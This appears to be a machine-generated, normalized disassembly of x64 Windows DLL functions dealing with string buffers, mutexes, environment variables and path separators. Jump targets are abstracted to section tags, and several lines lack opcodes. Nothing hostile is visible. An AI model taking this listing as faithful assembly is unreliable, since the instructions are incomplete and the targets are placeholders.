mov [ rbx ] 0x0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov [ rax ] dil
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 rdi
mov rdx rsi
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub rsi rax
mov r9 rdi
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180008000
sub_180008240
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov rcx [ rcx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsi ]
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rbp + rbp ]
lea rdx [ rsi + r12 * 2 ]
lea rcx [ rcx + rax * 2 ]
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
sub_180008370
push rbx
sub rsp 0x20
xor eax eax
mov [ rdx + 0x18 ] 0xf
mov rbx rdx
mov [ rdx + 0x10 ] rax
mov [ rdx ] al
lea rdx [ rcx + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x30 ] eax
call sub_180008000
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800083b0
push rbx
sub rsp 0x20
xor eax eax
mov rbx rdx
mov [ rdx + 0x18 ] 0x7
mov [ rdx + 0x10 ] rax
mov [ rdx ] ax
mov rdx rcx
mov rcx rbx
mov [ rsp + 0x38 ] eax
call sub_180001ba0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800083f0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x10
mov [ rsp + 0x30 ] rsi
jb r-xdata
xor esi esi
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] sil
cmp [ rdi + 0x18 ] 0x10
jae r-xdata
mov rcx [ rcx ]
call j_sub_18002094c#2
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
inc r8
call sub_1800205e0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] rsi
mov rsi [ rsp + 0x30 ]
sub_180008480
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rdx [ rcx + 0x18 ]
mov rax [ rcx + 0x8 ]
mov [ rsp + 0x38 ] rdi
mov rdx [ rax + rdx * 8 ]
mov rdi [ rdx + 0x8 ]
test rdi rdi
je r-xdata
inc [ rbx + 0x18 ]
mov rax [ rbx + 0x18 ]
mov rdi [ rsp + 0x38 ]
xor edx edx
cmp [ rbx + 0x10 ] rax
mov rcx rax
cmovbe rcx rdx
dec [ rbx + 0x20 ]
mov [ rbx + 0x18 ] rcx
jne r-xdata
[ rdi + 0x8 ]
mov [ rsp + 0x30 ] rsi
jne r-xdata
mov [ rbx + 0x18 ] rdx
mov rsi [ rsp + 0x30 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_180008500
push rbx
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov rbx rdx
mov [ rsp + 0x28 ] rdx
add rcx 0x10
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180008000
nop
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
mov al 0x1
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x40
pop rbx
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180008570
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov rbx rdx
mov [ rsp + 0x28 ] rdx
add rcx 0x68
xor edi edi
mov [ rcx + 0x10 ] rdi
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rax ] di
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180001ba0
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_180008600
mov r11 rsp
push rdi
sub rsp 0x60
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov rbx rdx
mov rdi rcx
mov [ r11 - 0x20 ] rdx
mov rcx [ rcx + 0x78 ]
test rcx rcx
je r-xdata
lea rcx [ rdi + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
call sub_180008240
xor esi esi
mov [ rbx + 0x10 ] rsi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rax [ r--data ]
mov [ rsp + 0x20 ] rax
mov r8d 0x2
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_1800210a4
nop
mov [ rax ] si
mov rcx [ rdi + 0x78 ]
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800086f0
push rbx
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rsi rdx
mov rbx rcx
mov rax [ rcx + 0x20 ]
inc rax
cmp [ rcx + 0x10 ] rax
ja r-xdata
mov rdi [ rbx + 0x18 ]
add rdi [ rbx + 0x20 ]
mov rax [ rbx + 0x10 ]
cmp rax rdi
ja r-xdata
mov edx 0x1
call sub_180007970
mov rax [ rbx + 0x8 ]
cmp [ rax + rdi * 8 ] 0x0
jne r-xdata
sub rdi rax
mov rax [ rbx + 0x8 ]
mov r9 [ rax + rdi * 8 ]
mov [ rsp + 0x70 ] r9
mov [ rsp + 0x78 ] r9
test r9 r9
je r-xdata
mov ecx 0x10
call sub_180021000
test rax rax
je r-xdata
inc [ rbx + 0x20 ]
add rsp 0x40
pop rdi
pop rsi
pop rbx
retn
xor eax eax
mov [ r9 ] rax
mov [ r9 + 0x8 ] rax
mov r8 [ rsi + 0x8 ]
mov rdx [ rsi ]
test r8 r8
je r-xdata
mov [ rsp + 0x60 ] rax
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x28 ]
call sub_180020424
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
int3
mov rcx [ rbx + 0x8 ]
mov [ rcx + rdi * 8 ] rax
jmp r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
nop [ rax ] eax
mov rcx r9
call sub_180003340
nop
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_1800087f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx rcx
cmp [ rcx + 0x20 ] rsi
je r-xdata
mov rdi [ rbx + 0x10 ]
test rdi rdi
je r-xdata
nop [ rax + rax ] ax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
nop [ rax + rax ] ax
cmp [ rbx + 0x20 ] rsi
jne r-xdata
mov rax [ rbx + 0x18 ]
lea rcx [ rcx + rax - 0x1 ]
mov rax [ rbx + 0x10 ]
cmp rax rcx
ja r-xdata
mov [ rbx + 0x8 ] rsi
mov [ rbx + 0x10 ] rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call j_sub_18002094c#2
test rdi rdi
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
call j_sub_18002094c#2
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
mov rax [ rbx + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdi [ rcx + 0x8 ]
test rdi rdi
je r-xdata
sub rcx rax
mov rcx [ rbx + 0x8 ]
dec rdi
cmp [ rcx + rdi * 8 ] rsi
je r-xdata
dec [ rbx + 0x20 ]
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
mov [ rbx + 0x18 ] rsi
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_1800088d0
push rbx
sub rsp 0x30
mov rax [ rdx + 0x18 ]
mov r10 r8
mov r8 [ rdx + 0x10 ]
mov r9 [ r10 + 0x10 ]
sub rax r8
mov r11 rdx
mov rbx rcx
mov [ rsp + 0x48 ] 0x0
cmp r9 rax
jbe r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
mov rcx r11
call sub_180007b00
mov rax [ r10 + 0x18 ]
sub rax r9
cmp rax r8
jb r-xdata
mov r8 rdx
xor r9d r9d
mov rcx r10
xor edx edx
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_180007c20
jmp r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rdx rax
mov rcx rbx
mov [ rbx ] 0x0
call sub_1800083f0
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_180008960
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
xor edi edi
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] edi
call sub_180008240
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_180003cb0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_1800089c0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x30
mov rax r8
mov rbx rcx
mov r8 rdx
xor edi edi
xor r9d r9d
xor edx edx
mov rcx rax
mov [ rsp + 0x20 ] 0xffffffffffffffff
mov [ rsp + 0x40 ] edi
call sub_180007dd0
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_180003cb0
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180008a20
mov rax rsp
push rbp
push r12
push r13
lea rbp [ rax - 0x5f ]
sub rsp 0xb0
mov [ rbp - 0x49 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rbx rcx
xor edi edi
mov rcx [ rcx + 0x10 ]
call sub_180018380
test al al
jne r-xdata
mov rax rdi
mov rcx [ rbx + 0x10 ]
call sub_180018800
mov rsi rax
mov [ rbp + 0x27 ] 0xf
mov [ rbp + 0x1f ] rdi
mov [ rbp + 0xf ] dil
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf ]
call sub_180008110
nop
lea rdx [ rbp - 0x19 ]
mov rcx rsi
call sub_180008370
nop
lea r8 [ rbp + 0xf ]
mov rdx rax
lea rcx [ rbp - 0x41 ]
call sub_1800088d0
mov rdx rax
mov rcx rsi
call sub_180008500
nop
cmp [ rbp - 0x1 ] 0x10
jb r-xdata
mov [ rbp - 0x1 ] 0xf
mov [ rbp - 0x9 ] rdi
mov [ rbp - 0x19 ] 0x0
cmp [ rbp + 0x27 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x19 ]
mov rcx rsi
call sub_180008370
mov r13 [ rax + 0x10 ]
add r13 [ rsi + 0x8 ]
cmp [ rbp - 0x1 ] 0x10
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
mov edx 0x1
mov rcx r13
call sub_180021308
mov r12 rax
test rax rax
je r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
lea rdx [ rbp + 0xf ]
mov rcx rsi
call sub_180008370
mov rbx rax
lea rdx [ rbp - 0x19 ]
mov rcx rsi
call sub_180008370
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov r9 [ rbx + 0x10 ]
mov r8 rax
mov rdx r13
mov rcx r12
call sub_18002134c
cmp [ rbp - 0x1 ] 0x10
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x1 ] 0xf
mov [ rbp - 0x9 ] rdi
mov [ rbp - 0x19 ] 0x0
cmp [ rbp + 0x27 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0xf ]
mov rcx rsi
call sub_180008370
mov rbx rax
lea rdx [ rbp - 0x19 ]
mov rcx rsi
call sub_180008370
mov rcx [ rax + 0x10 ]
mov rdx r13
sub rdx [ rbx + 0x10 ]
add rcx r12
mov r9 [ rsi + 0x8 ]
mov r8 [ rsi ]
call sub_18002134c
cmp [ rbp - 0x1 ] 0x10
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
mov [ rbp - 0x1 ] 0xf
mov [ rbp - 0x9 ] rdi
mov [ rbp - 0x19 ] 0x0
cmp [ rbp + 0x27 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
mov rcx rsi
call sub_180007f90
mov rcx rsi
call j_sub_18002094c#2
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
movzx ecx [ rw-data ]
mov [ rax + 0x4 ] cx
mov [ rax + 0x6 ] 0x66
movzx ecx [ rw-data ]
mov [ rax + 0x7 ] cl
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r13
mov [ rax ] edi
mov rdi rax
sub_180008c70
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0x1d8 ]
sub rsp 0x2c0
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1b0 ] rax
mov rbx r8
mov rdi rdx
mov [ rsp + 0x40 ] rbx
xor r12d r12d
mov [ rsp + 0x30 ] r12d
mov r8 [ r8 + 0x10 ]
test r8 r8
je r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rdi
call sub_180003930
nop
mov [ rsp + 0x20 ] 0x1
lea r9 [ r--data ]
xor edx edx
mov rcx rbx
call sub_180007300
test eax eax
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov rax rdi
mov [ rbx ] r12w
mov rcx [ rbp + 0x1b0 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x2c0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rcx [ rbx + 0x18 ]
cmp rcx 0x8
jb r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea rax [ rdx + rax * 2 ]
cmp rcx 0x8
jb r-xdata
mov rdx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov edx 0x5c
nop [ rax + rax ] eax
cmp rcx rax
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx 0x2
cmp rcx rax
jne r-xdata
mov [ rcx ] dx
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
dec rdx
mov r8d 0x1
mov rcx rbx
call sub_180001260
cmp [ rax + rdx * 2 - 0x2 ] 0x5c
jne r-xdata
cmp [ rcx ] 0x2f
jne r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
mov rdx rbx
mov rcx rdi
call sub_180003cb0
nop
jmp r-xdata
mov edx 0x25
or r8 0xffffffffffffffff
mov rcx rbx
call sub_180007410
mov rsi rax
lea r9 [ rax - 0x1 ]
mov r8d 0x1
lea rdx [ rsp + 0x48 ]
mov rcx rbx
call sub_1800083b0
nop
test rsi rsi
jne r-xdata
cmp [ rax ] 0x25
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea r8 [ rsi + 0x1 ]
xor edx edx
mov rcx rbx
call sub_180001260
mov [ rbx + 0x10 ] r12
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r12
mov [ rsp + 0x70 ] r12w
mov r8d eax
lea rdx [ rbp - 0x60 ]
lea rcx [ rsp + 0x70 ]
call sub_180003930
nop
mov r8 rbx
lea rdx [ rsp + 0x70 ]
mov rcx rdi
call sub_180008960
nop
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
xor r8d r8d
lea rdx [ r--data ]
mov rcx rdi
call sub_180003930
nop
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r12
mov [ rsp + 0x70 ] r12w
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] r12
mov [ rsp + 0x48 ] r12w
jmp r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_18002094c#2
mov [ rbp - 0x60 ] r12w
xor edx edx
mov r8d 0x206
lea rcx [ rbp - 0x5e ]
call sub_180021150
lea rcx [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rcx [ rsp + 0x48 ]
mov r8d 0x104
lea rdx [ rbp - 0x60 ]
call [ GetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
mov [ rax ] r12w
jmp r-xdata
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] r12
mov [ rsp + 0x48 ] r12w
jmp r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_18002094c#2
sub_180008f70
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
call sub_1800087f0
nop
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
sub_180008fb0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
lea rbx [ rdi + 0x48 ]
mov [ rsp + 0x48 ] rbx
mov rcx rbx
call sub_1800087f0
nop
mov rcx [ rbx ]
call j_sub_18002094c#2
xor esi esi
mov [ rbx ] rsi
cmp [ rdi + 0x30 ] 0x8
jb r-xdata
mov rcx rbx
call sub_180018760
mov rcx rbx
call j_sub_18002094c#2
nop
mov [ rdi + 0x30 ] 0x7
mov [ rdi + 0x28 ] rsi
mov [ rdi + 0x18 ] si
lea rax [ r--data ]
mov [ rdi ] rax
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rdi + 0x18 ]
call j_sub_18002094c#2
sub_180009050
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
cmp [ rdx ] 0x0
je r-xdata
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
add rcx 0x48
call sub_1800086f0
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
xor al al
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov al 0x1
jmp r-xdata
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180009120
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rbx rcx
xor edi edi
mov [ rcx + 0x8 ] di
lea rax [ r--data ]
mov [ rcx ] rax
mov [ rcx + 0x30 ] 0x7
mov [ rcx + 0x28 ] rdi
mov [ rcx + 0x18 ] di
add rcx 0x48
lea rdx [ rsp + 0x48 ]
call sub_1800134e0
nop
mov rax [ rw-data ]
mov [ rbx + 0x40 ] rax
mov ecx 0x90
call sub_180021000
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
mov [ rbx + 0x10 ] rdi
movzx eax [ rw-data ]
mov [ rbx + 0x8 ] ax
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rdx [ rw-data ]
mov rcx rax
call sub_1800189f0
mov rdi rax
sub_1800091c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180008fb0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_1800091f0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180005510
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov rdx rdi
call sub_180003cb0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180005510
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
call sub_180003cb0
nop
sub_1800092e0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0xb0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r14 r9
mov rbp r8
mov r12 rdx
mov [ rsp + 0x30 ] rdx
xor r15d r15d
mov [ rsp + 0x20 ] r15d
mov [ rdx ] r15
mov [ rdx + 0x8 ] r15
mov [ rdx + 0x10 ] r15
mov [ rsp + 0x20 ] 0x1
mov ebx r15d
mov esi r15d
test r9 r9
je r-xdata
mov edx 0x2
lea rcx [ rsi + 0x2 ]
call sub_180021308
mov r13 rax
sub rbp rsi
lea r8 [ rbx + rbp ]
lea rdx [ rsi + rsi + 0x4 ]
mov r9 rsi
mov rcx rax
call sub_18002134c
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] r15
mov [ rsp + 0x38 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r13
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r13
lea rcx [ rsp + 0x38 ]
call sub_180003930
nop
lea rdx [ rsp + 0x38 ]
mov rcx r12
call sub_1800091f0
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
nop [ rax + rax ] eax
mov rcx r13
call sub_18002094c
mov rax r12
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xb0 ]
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
inc rbx
inc rsi
cmp rbx r14
jb r-xdata
mov edx 0x2
lea rcx [ rsi + 0x2 ]
call sub_180021308
mov r13 rax
mov r8 rbp
sub r8 rsi
add r8 rbx
lea rdx [ rsi + rsi + 0x4 ]
mov r9 rsi
mov rcx rax
call sub_18002134c
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] r15
mov [ rsp + 0x38 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r13
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r13
lea rcx [ rsp + 0x38 ]
call sub_180003930
nop
lea rdx [ rsp + 0x38 ]
mov rcx r12
call sub_1800091f0
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
movzx ecx [ rbx + rbp ]
movsx eax [ rw-data ]
